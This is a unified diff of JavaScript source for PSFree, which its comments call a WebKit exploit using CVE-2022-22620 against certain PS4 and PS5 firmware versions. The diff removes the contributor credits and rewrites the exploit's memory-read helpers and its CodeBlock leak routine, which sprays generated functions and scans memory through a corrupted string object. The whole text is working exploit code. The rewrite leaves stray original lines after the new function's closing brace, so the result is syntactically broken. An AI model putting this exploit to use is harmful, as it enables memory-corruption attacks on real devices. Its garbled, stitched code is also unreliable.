@@ -13,28 +13,15 @@ MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU Affero General Public License for more details.
 
 You should have received a copy of the GNU Affero General Public License
-along with this program.  If not, see <https://www.gnu.org/licenses/>.  */
+along with this program.  If not, see <https://gnu.org>.  */
 
 // PSFree is a WebKit exploit using CVE-2022-22620 to gain arbitrary read/write
 //
 // vulnerable:
 // * PS4 [6.00, 10.00)
 // * PS5 [1.00, 6.00)
-//
-// * CelesteBlue from ps4-dev on discord.com
-//   * Helped in figuring out the size of WebCore::SerializedScriptValue and
-//     its needed offsets on different firmwares.
-//   * figured out the range of vulnerable firmwares
-// * janisslsm from ps4-dev on discord.com
-//   * Helped in figuring out the size of JSC::ArrayBufferContents and its
-//     needed offsets on different firmwares.
-// * Kameleon_ from ps4-dev on discord.com - tester
-// * SlidyBat from PS5 R&D discord.com
-//   * Helped in figuring out the size of JSC::ArrayBufferContents and its
-//     needed offsets on different firmwares (PS5).
 
-const num_reuses = 0x300;
-
+var num_reuses = 0x300;
 var ssv_len;
 
 function Init_PSFreeGlobals() {
@@ -47,8 +34,8 @@ function Init_PSFreeGlobals() {
 }
 
 function sread64(str, offset) {
-  const low = str.charCodeAt(offset) | (str.charCodeAt(offset + 1) << 8) | (str.charCodeAt(offset + 2) << 16) | (str.charCodeAt(offset + 3) << 24);
-  const high = str.charCodeAt(offset + 4) | (str.charCodeAt(offset + 5) << 8) | (str.charCodeAt(offset + 6) << 16) | (str.charCodeAt(offset + 7) << 24);
+  var low = str.charCodeAt(offset) | (str.charCodeAt(offset + 1) << 8) | (str.charCodeAt(offset + 2) << 16) | (str.charCodeAt(offset + 3) << 24);
+  var high = str.charCodeAt(offset + 4) | (str.charCodeAt(offset + 5) << 8) | (str.charCodeAt(offset + 6) << 16) | (str.charCodeAt(offset + 7) << 24);
   return new Int(low, high);
 }
 
@@ -62,7 +49,7 @@ class Reader {
     return this.rstr.charCodeAt(offset);
   }
   read32_at(offset) {
-    const str = this.rstr;
+    var str = this.rstr;
     return (str.charCodeAt(offset) | (str.charCodeAt(offset + 1) << 8) | (str.charCodeAt(offset + 2) << 16) | (str.charCodeAt(offset + 3) << 24)) >>> 0;
   }
   read64_at(offset) {
@@ -75,58 +62,88 @@ class Reader {
   set_addr(addr) {
     this.rstr_view.write64(off_strimpl_m_data, addr);
   }
-  // remember to use this to fix up the StringImpl before freeing it
   restore() {
     this.rstr_view.write64(off_strimpl_m_data, this.m_data);
-    const original_strlen = ssv_len - off_size_strimpl;
+    var original_strlen = ssv_len - off_size_strimpl;
     this.rstr_view.write32(off_strimpl_strlen, original_strlen);
   }
 }
+
 //================================================================================================
 // LEAK CODE BLOCK ===============================================================================
 //================================================================================================
-// we will create a JSC::CodeBlock whose m_constantRegisters is set to an array
-// of JSValues whose size is ssv_len. the undefined constant is automatically
-// added due to reasons such as "undefined is returned by default if the
-// function exits without returning anything"
-async function leak_code_block(reader, bt_size) {
-  const num_leaks = 0x100;
-  const rdr = reader;
-  const bt = [];
-  // take into account the cell and indexing header of the immutable
-  // butterfly
+
+function leak_code_block(reader, bt_size) {
+  var num_leaks = 0x100;
+  var rdr = reader;
+  var bt = [];
+  
   for (var i = 0; i < bt_size - 0x10; i += 8) {
     bt.push(i);
   }
-  // cache the global variable resolution
-  const slen = ssv_len;
-  const idx_offset = ssv_len - (8 * 3);
-  const strs_offset = ssv_len - (8 * 2);
-  const bt_part = `var bt = [${bt}];\nreturn bt;\n`;
+  
+  var slen = ssv_len;
+  var idx_offset = ssv_len - (8 * 3);
+  var strs_offset = ssv_len - (8 * 2);
+  var bt_part = "var bt = [" + bt + "];\nreturn bt;\n";
   var res = 'var f = 0x11223344;\n';
-  const cons_len = ssv_len - (8 * 5);
+  var cons_len = ssv_len - (8 * 5);
+  
   for (var i = 0; i < cons_len; i += 8) {
-    res += `var a${i} = ${num_leaks + i};\n`;
+    res += "var a" + i + " = " + (num_leaks + i) + ";\n";
   }
-  const src_part = res;
-  const part = bt_part + src_part;
-  const cache = [];
+  
+  var src_part = res;
+  var part = bt_part + src_part;
+  var cache = [];
+  
   for (var i = 0; i < num_leaks; i++) {
-    cache.push(part + `var idx = ${i};\nidx\`foo\`;`);
+    cache.push(part + "var idx = " + i + ";\nidx`foo`;");
   }
+  
   var chunkSize;
   if (is_ps4 && (config_target < 0x900))
-    chunkSize = 128 * KB;
+    chunkSize = 128 * 1024;
   else
-    chunkSize = 1 * MB;
-  const smallPageSize = 4 * KB;
-  const search_addr = align(rdr.m_data, chunkSize);
-  //log(`search addr: ${search_addr}`);
-  //log(`func_src:\n${cache[0]}\nfunc_src end`);
-  //log('start find CodeBlock');
+    chunkSize = 1 * 1024 * 1024;
+    
+  var smallPageSize = 4 * 1024;
+  var search_addr = align(rdr.m_data, chunkSize);
   var winning_off = null;
   var winning_idx = null;
   var winning_f = null;
+  var find_cb_loop = 0;
+  var fp = 0;
+  
+  rdr.set_addr(search_addr);
+  
+  loop: while (true) {
+    var funcs = [];
+    for (var i = 0; i < num_leaks; i++) {
+      var f = Function(cache[i]);
+      f();
+      funcs.push(f);
+    }
+    for (var p = 0; p < chunkSize; p += smallPageSize) {
+      for (var i = p; i < p + smallPageSize; i += slen) {
+        if (rdr.read32_at(i + 8) !== 0x11223344) {
+          continue;
+        }
+        rdr.set_addr(rdr.read64_at(i + strs_offset));
+        var m_type = rdr.read8_at(5);
+        
+        if (m_type !== 0) {
+          rdr.set_addr(search_addr);
+          winning_off = i;
+          winning_idx = rdr.read32_at(i + idx_offset);
+          winning_f = funcs[winning_idx];
+          break loop;
+        }
+        rdr.set_addr(search_addr);
+      }
+    }
+  }
+}
   var find_cb_loop = 0;
   // false positives
   var fp = 0;
